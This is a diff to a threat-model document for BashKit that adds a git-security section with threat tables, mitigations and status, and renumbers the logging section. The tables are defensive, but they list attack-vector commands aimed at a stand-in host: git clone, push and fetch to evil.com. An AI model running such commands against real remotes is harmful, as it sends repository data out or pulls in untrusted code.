@@ -26,6 +26,7 @@ All threats use a stable ID format: `TM-<CATEGORY>-<NUMBER>`
 | TM-NET | Network Security | DNS manipulation, HTTP attacks, network bypass |
 | TM-ISO | Isolation | Multi-tenant cross-access |
 | TM-INT | Internal Errors | Panic recovery, error message safety, unexpected failures |
+| TM-GIT | Git Security | Repository access, identity leak, remote operations |
 | TM-LOG | Logging Security | Sensitive data in logs, log injection, log volume attacks |
 
 ### Adding New Threats
@@ -596,12 +597,63 @@ fn validate_format(format: &str) -> Result<(), String> {
 
 ---
 
-### 8. Logging Security
+### 8. Git Security
+
+BashKit provides optional sandboxed git operations via the `git` feature. This section documents
+security threats related to git operations and their mitigations.
+
+#### 8.1 Repository Access
+
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-GIT-001 | Unauthorized clone | `git clone https://evil.com/repo` | Remote URL allowlist (Phase 2) | **PLANNED** |
+| TM-GIT-002 | Host identity leak | Commit reveals real name/email | Configurable sandbox identity | **MITIGATED** |
+| TM-GIT-003 | Host git config access | Read ~/.gitconfig | No host filesystem access | **MITIGATED** |
+| TM-GIT-004 | Credential theft | Access git credential store | No host filesystem access | **MITIGATED** |
+| TM-GIT-005 | Repository escape | `git clone` outside VFS | All paths in VFS | **MITIGATED** |
+
+**Current Risk**: LOW - All git operations confined to virtual filesystem
+
+**Implementation**: `git/client.rs`
+```rust
+// THREAT[TM-GIT-002]: Host identity leak
+// Author identity is configurable, never reads from host ~/.gitconfig
+let config = format!(
+    "[user]\n\tname = {}\n\temail = {}\n",
+    self.config.author_name, self.config.author_email
+);
+```
+
+#### 8.2 Git-specific DoS
+
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-GIT-006 | Large repo clone | Clone huge repository | FS size limits + response limit (Phase 2) | **PLANNED** |
+| TM-GIT-007 | Many git objects | Create millions of git objects | `max_file_count` FS limit | **MITIGATED** |
+| TM-GIT-008 | Deep history | Very long commit history | Log limit parameter | **MITIGATED** |
+| TM-GIT-009 | Large pack files | Huge .git/objects/pack | `max_file_size` FS limit | **MITIGATED** |
+
+**Current Risk**: LOW - Filesystem limits apply to all git operations
+
+#### 8.3 Remote Operations (Phase 2)
+
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-GIT-010 | Push to unauthorized remote | `git push evil.com` | Remote URL allowlist | **PLANNED** |
+| TM-GIT-011 | Fetch from unauthorized remote | `git fetch evil.com` | Remote URL allowlist | **PLANNED** |
+| TM-GIT-012 | SSH key access | Use host SSH keys | HTTPS only (no SSH) | **PLANNED** |
+| TM-GIT-013 | Git protocol bypass | Use git:// protocol | HTTPS only | **PLANNED** |
+
+**Current Risk**: N/A - Remote operations not yet implemented (Phase 2)
+
+---
+
+### 9. Logging Security
 
 BashKit provides optional structured logging via the `logging` feature. This section documents
 security threats related to logging and their mitigations.
 
-#### 8.1 Sensitive Data Leakage
+#### 9.1 Sensitive Data Leakage
 
 | ID | Threat | Attack Vector | Mitigation | Status |
 |----|--------|--------------|------------|--------|
@@ -633,7 +685,7 @@ assert_eq!(config.redact_value("sk-1234567890abcdef"), "[REDACTED]");
 **Caller Warning**: Using `LogConfig::unsafe_disable_redaction()` or
 `LogConfig::unsafe_log_scripts()` may expose sensitive data in logs.
 
-#### 8.2 Log Injection
+#### 9.2 Log Injection
 
 | ID | Threat | Attack Vector | Mitigation | Status |
 |----|--------|--------------|------------|--------|
@@ -650,7 +702,7 @@ let sanitized = sanitize_for_log(input);
 // Result: "normal\\n[ERROR] injected"
 ```
 
-#### 8.3 Log Volume Attacks
+#### 9.3 Log Volume Attacks
 
 | ID | Threat | Attack Vector | Mitigation | Status |
 |----|--------|--------------|------------|--------|
@@ -668,7 +720,7 @@ let truncated = config.truncate(&long_value);
 // Result: "aaa...[truncated 800 bytes]"
 ```
 
-#### 8.4 Logging Security Configuration
+#### 9.4 Logging Security Configuration
 
 **Secure Defaults** (TM-LOG-001 to TM-LOG-008):
 ```rust
